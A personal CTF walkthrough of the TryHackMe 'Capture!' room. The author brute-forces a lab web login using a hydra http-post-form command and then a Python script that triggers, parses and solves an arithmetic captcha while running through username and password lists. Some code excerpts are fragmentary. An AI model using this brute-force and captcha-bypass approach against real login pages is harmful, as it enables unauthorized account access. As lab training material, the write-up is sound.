
# Capture! CTF from TryHackMe Walkthrough

Welcome! Thanks for checking out my walkthrough. This room was simple to understand, but needed a little bit of custom automation that could potentially take longer than some rooms. I will walkthrough what I did in order to crack the username and password for this website.


## Recon

Included in the room was a zip file which included two text files: `usernames.txt` and `passwords.txt`. This pretty much told me from the start that I would be cracking some usernames and passwords.

When I first saw the login screen on the web application, my assumptions were confirmed.

![App Screenshot](https://willmaxcy.com/assets/imgs/capture/1.png?text=First+Pic)

I saw trying to login with wrong credentials left an error at the bottom of the page.

![App Screenshot](https://willmaxcy.com/assets/imgs/capture/2.png?text=Second+Pic)

In order to see what was going on under the hood, I opened up Burp Suite and checked out the raw HTTP request. I could see the data sent and what the response was from the server.

![App Screenshot](https://willmaxcy.com/assets/imgs/capture/3.png?text=Third+Pic)

With the information I gathered I decided to use [hydra](https://github.com/vanhauser-thc/thc-hydra) to try to crack both usernames and passwords. First trying to crack the usernames, I entered the command:
```bash
hydra -L usernames.txt -p password -t 64 -s 80 10.10.204.24 http-post-form "/login:username=^USER^&password=^PASS^:Error\: The user " 
```
Here I used the `usernames.txt` to enumerate the usernames. After trying this for a few minutes, I noticed that this wasn't returning what I would hope. After troubleshooting hydra and trying to figure out what potential command mistake I made, I looked at the website again only to find that the login page had changed!

![App Screenshot](https://willmaxcy.com/assets/imgs/capture/5.png?text=Fifth+Pic)

A captcha! Uh-oh. I've never dealth with breaking one of these before. After playing around in Brup Suite a while longer, I learned that the captcha from the previous page was the answer for the new login page. So the data needed to post correctly would be `username`, `password`, and `captcha`. In order to crack this login, it seems that I would have to write a custom script.

## Scripting

From what I learned about the web application, I had to create a script that would do the follwoing:

 - [ ]  Load both `usernames.txt` and `passwords.txt` into the program.
 - [ ]  Trigger the captcha.
 - [ ]  Find way to identify the elements in the captcha:
   - [ ]  Opperands
   - [ ]  Opperant
 - [ ]  Send correct captcha to the server while enumerating `usernames.txt`.
 - [ ]  Once username is found, enumerate `passwords.txt`
 - [ ]  Print out correct username and password.

I used these tasks to break about my code into smaller parts. The actual code is available at the top of this page, but you can also access it [here](https://github.com/wsmaxcy/capture/blob/master/capture.py).

 - [X]  Load both `usernames.txt` and `passwords.txt` into the program.
```python
# load list of usernames
def load_users():
	users = list()
	with open("usernames.txt") as f:
		for line in f:
			users.append(line.rstrip('\n'))
	print('[+] Loaded ' + str(len(users)) + ' usernames to attempt.')
	return users

# loads list of passwords
def load_passwords():
	passwords = list()
	with open("passwords.txt") as f:
		for line in f:
			passwords.append(line.rstrip('\n'))
	print('[+] Loaded '+ str(len(passwords)) + ' passwords to attempt.')
	return passwords

```
- [x]  Trigger the captcha.
```python
# sends 10 requests in order start the captcha
for i in range(10):
	data = {
	'username': 'username',
	'password': 'password'
	}
	r = requests.post(url,data=data)
	print("[+] Sent "+ str(i+1) + "/10 requests to trigger captcha.", end = '\r')
```
 - [x]  Find way to identify the elements in the captcha:
   - [x]  Opperands
   - [x]  Opperant
```python
# username and password
person = ''
password = ''

# data used for post request
	length = len(password) -1
	data = {
	'username': username,
	'password': password,
	'captcha': cap
	}

	# Data used to find captcha
	r = requests.post(url,data=data)
	eq = r.text[1839 + length:1847 + length]
	
	# if statement that returns when the page is authenticated
	if eq == '':
		print('[+] Password found: ' + password)
		return -1

	num1 = int(eq[:3])
	num2 = int(eq[6:8])
	opp = eq[4]

    # finding out which operator to use for captcha equasion
	if opp == '+':
		cap = num1 + num2
	elif opp == '-':
		cap = num1 - num2
	else:
		cap = num1 * num2

    return cap
```
 - [x]  Send correct captcha to the server while enumerating `usernames.txt`.
 - [x]  Once username is found, enumerate `passwords.txt`
```python
# iterates through usernames list
for name in users:
	cur = send_request(name, 'password', cur)
	if cur == -1:
		person = person + name
		break;

passwords = load_passwords()

# iterates through password list
for p in passwords:

	cur = last_request(person, p, cur)
	if cur == -1:
		password = password + p
		break
```
- [x]  Print out correct username and password.
```python
# final print of username and password
print('[+] Username: ' + person)
print('[+] Password: ' + password)
```

After a lot of trial and error building the script, it ended up cracking both the username and the password.

![App Screenshot](https://willmaxcy.com/assets/imgs/capture/6.png?text=Sixth+Pic)

When I logged on with the information, I got the flag.

![App Screenshot](https://willmaxcy.com/assets/imgs/capture/7.png?text=Sixth+Pic)

Thanks for checking out my writeup! It's my first one, so if there are any comments or criticisms, I would love to hear them.


## Feedback

If you have any feedback, please reach out to me at will@willmaxcy.com.



[![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://willmaxcy.com/)
[![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/willmaxcy)
